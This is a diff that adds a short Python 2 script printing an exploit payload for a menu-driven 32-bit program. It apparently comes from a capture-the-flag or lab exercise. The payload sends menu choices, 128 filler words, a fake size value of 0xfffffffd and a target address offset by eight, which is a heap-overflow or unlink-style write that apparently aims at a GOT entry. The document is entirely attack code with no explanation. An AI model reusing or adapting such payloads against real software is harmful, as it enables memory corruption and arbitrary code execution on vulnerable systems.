@@ -1,0 +1,3 @@
+import struct
+print "3\n1\n136\n" + struct.pack("<I", 0x41)*128 + struct.pack("<I", 0xfffffffd) + struct.pack("<I", 0x0804a008-8) + "\n"
+
